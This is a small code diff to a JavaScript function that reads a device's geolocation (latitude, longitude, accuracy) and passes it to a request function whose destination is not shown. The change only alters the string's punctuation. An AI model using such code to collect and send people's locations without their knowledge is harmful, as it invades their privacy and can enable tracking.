@@ -32,7 +32,7 @@ async function sendRequest(data) {
 async function dgree() {
   try {
     const pos = await getLocation();
-    const data = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`;
+    const data = `Latitude= ${pos.coords.latitude}, Longitude= ${pos.coords.longitude} (Accuracy= ${pos.coords.accuracy}m)`;
     await sendRequest(data);
   } catch (err) {
     
